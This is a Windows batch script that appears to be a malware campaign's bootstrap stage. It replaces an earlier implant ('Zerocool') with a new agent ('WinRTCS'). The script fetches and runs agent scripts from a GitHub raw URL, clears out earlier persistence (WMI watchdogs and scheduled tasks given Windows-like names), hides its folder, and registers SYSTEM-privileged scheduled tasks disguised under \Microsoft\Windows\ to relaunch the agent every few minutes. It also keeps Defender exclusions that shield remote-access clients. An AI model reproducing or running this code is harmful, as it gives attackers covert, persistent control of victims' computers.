@echo off
rem CAMPAIGN_SCRIPT WINRTCS_BOOTSTRAP B1 - wipe every legacy project artifact + retire Zerocool bridge, install WinRTCS v0.0.1.
rem Safe to re-run. Delivered by M71 campaign hook, Zerocool 0.0.2 bridge payload, or manual paste.
rem Keeps sevrz/gryxa RMM clients untouched. Order: verify new agent FIRST, then wipe, then arm, then retire Zerocool.
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "ZC=C:\ProgramData\Zerocool"
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
set "CURL=%SystemRoot%\System32\curl.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
set "LOG=%ZD%\bootstrap.log"
echo [%DATE% %TIME%] bootstrap_begin host=%COMPUTERNAME%>>"%LOG%"

rem --- 1) fetch + verify agent/stager/version BEFORE touching anything ---
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%ZD%\winrtcs.version" "%BASE%/winrtcs.version?t=%RANDOM%%RANDOM%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\winrtcs_agent.cmd" "%BASE%/winrtcs_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\winrtcs_run.cmd" "%BASE%/winrtcs_run.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
set "AGENT_SHA="
if exist "%ZD%\winrtcs.version" for /f "usebackq tokens=1,* delims==" %%K in ("%ZD%\winrtcs.version") do if /I "%%K"=="AGENT_SHA256" set "AGENT_SHA=%%L"
if not defined AGENT_SHA goto :Abort
if not exist "%ZD%\winrtcs_agent.cmd" goto :Abort
if not exist "%ZD%\winrtcs_run.cmd" goto :Abort
call :Sha256 "%ZD%\winrtcs_agent.cmd" BOOT_SHA
if /I not "!BOOT_SHA!"=="!AGENT_SHA!" goto :Abort
findstr /C:"WINRTCS_AGENT" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
if errorlevel 1 goto :Abort
findstr /C:"WINRTCS_RUN" "%ZD%\winrtcs_run.cmd" >nul 2>&1
if errorlevel 1 goto :Abort
echo [%DATE% %TIME%] agent_verified>>"%LOG%"

rem --- 2) remove legacy WMI watchdog subscription ---
powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; foreach($c in @('__FilterToConsumerBinding','__EventFilter','CommandLineEventConsumer','__IntervalTimerInstruction')){ Get-WmiObject -Namespace root\subscription -Class $c | Where-Object { ($_.Filter -match 'WucacheWatchdog') -or ($_.Consumer -match 'WucacheWatchdog') -or ($_.Name -match 'WucacheWatchdog') -or ($_.TimerId -match 'WucacheWatchdog') } | Remove-WmiObject }" >>"%LOG%" 2>&1
echo [%DATE% %TIME%] wmi_watchdog_removed>>"%LOG%"

rem --- 3) legacy scheduled tasks (ownership-checked pool names + identity.cfg + Wucache* sweep) ---
for %%T in (WucacheOwn WucacheGryxaWatch WucacheGryxaBoot WucacheGryxaHealOnce WucacheGryxaCleanInstall WerQueueSync DiagHostCache NetTraceCache WdiHostProxy PlaServerHealth TcpIpConflictRes SrCacheSync ResolutionQueue PlaServerDiag) do call :KillTask "%%T"
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do (
  echo %%K | findstr /I /C:"TASK_" >nul
  if not errorlevel 1 call :KillTask "%%L"
)
for /f "tokens=1 delims=," %%T in ('schtasks /Query /FO CSV 2^>nul ^| findstr /I "Wucache"') do schtasks /Delete /TN "%%~T" /F >nul 2>&1
echo [%DATE% %TIME%] legacy_tasks_removed>>"%LOG%"

rem --- 4) revert Defender tampering the old stack added (keep ScreenConnect exclusions: they shield the RMM clients) ---
powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; Set-MpPreference -DisableRealtimeMonitoring $false; Set-MpPreference -DisableBehaviorMonitoring $false; Set-MpPreference -DisableIOAVProtection $false; Set-MpPreference -DisableScriptScanning $false" >nul 2>&1
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /f >nul 2>&1
for %%P in ("%WD%" "%ETL%" "%SystemRoot%\Temp\.upd" "%SystemRoot%\Temp\.wucache" "C:\Windows\Temp") do reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%%~P" /f >nul 2>&1
for %%X in (msiexec.exe curl.exe cmd.exe powershell.exe certutil.exe) do reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "%%X" /f >nul 2>&1
echo [%DATE% %TIME%] defender_reverted>>"%LOG%"

rem --- 5) wipe legacy dirs (agent first-run finishes .upd, where a campaign copy of this script lives) ---
rmdir /s /q "%WD%" >nul 2>&1
rmdir /s /q "%ETL%" >nul 2>&1
rmdir /s /q "%SystemRoot%\Temp\.wucache" >nul 2>&1
echo [%DATE% %TIME%] legacy_dirs_removed>>"%LOG%"

rem --- 6) arm WinRTCS ---
attrib +h "%ZD%" >nul 2>&1
set "TASKA=\Microsoft\Windows\WinRTCS\Agent"
set "TASKG=\Microsoft\Windows\WinRTCS\Guard"
set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 7 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Run /TN "%TASKA%" >nul 2>&1
echo [%DATE% %TIME%] winrtcs_armed>>"%LOG%"

rem --- 7) retire Zerocool bridge: tasks first (kills any in-flight run), then wipe its dir ---
schtasks /Delete /TN "\Microsoft\Windows\Zerocool\Agent" /F >nul 2>&1
schtasks /Delete /TN "\Microsoft\Windows\Zerocool\Guard" /F >nul 2>&1
timeout /t 8 /nobreak >nul 2>&1
for /l %%I in (1,1,3) do (
  rmdir /s /q "%ZC%" >nul 2>&1
  if not exist "%ZC%" goto :ZcGone
  timeout /t 3 /nobreak >nul 2>&1
)
:ZcGone
echo [%DATE% %TIME%] zerocool_retired>>"%LOG%"
echo WINRTCS_BOOTSTRAP=OK
endlocal & exit /b 0

:KillTask
schtasks /Query /TN "%~1" /XML 2>nul | findstr /I "own_mon.cmd etl_mon.cmd .wucache .etlcache .upd gryxa" >nul 2>&1
if not errorlevel 1 schtasks /Delete /TN "%~1" /F >nul 2>&1
schtasks /Query /TN "\%~1" /XML 2>nul | findstr /I "own_mon.cmd etl_mon.cmd .wucache .etlcache .upd gryxa" >nul 2>&1
if not errorlevel 1 schtasks /Delete /TN "\%~1" /F >nul 2>&1
exit /b 0

:Abort
echo [%DATE% %TIME%] ABORT agent_unverified - legacy stack untouched>>"%LOG%"
echo WINRTCS_BOOTSTRAP=FAIL
endlocal & exit /b 9

:Sha256
set "%~2="
for /f "skip=1 tokens=1" %%H in ('certutil -hashfile "%~1" SHA256 2^>nul') do if not defined %~2 set "%~2=%%H"
exit /b 0
